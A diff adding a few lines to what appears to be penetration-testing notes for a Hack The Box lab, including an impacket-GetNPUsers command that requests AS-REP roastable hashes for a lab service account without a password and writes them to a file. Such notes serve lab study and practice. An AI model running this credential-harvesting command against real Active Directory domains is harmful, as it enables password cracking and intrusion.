@@ -880,6 +880,14 @@ Try moving lateraly with:
 \- RunAS: [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs](#https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs)
 
 
+You can AR REP wihtour user credentials \(maybe Kerberoast without user credentials?\):
+
+```
+ impacket-GetNPUsers -request -dc-ip 10.129.103.173
+htb.local/svc-alfresco -outputfile hashes.kerberoast -no-pass 
+ ```
+
+
 ### File Transfer 
 
 We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali \(from the Pivot Machine\):
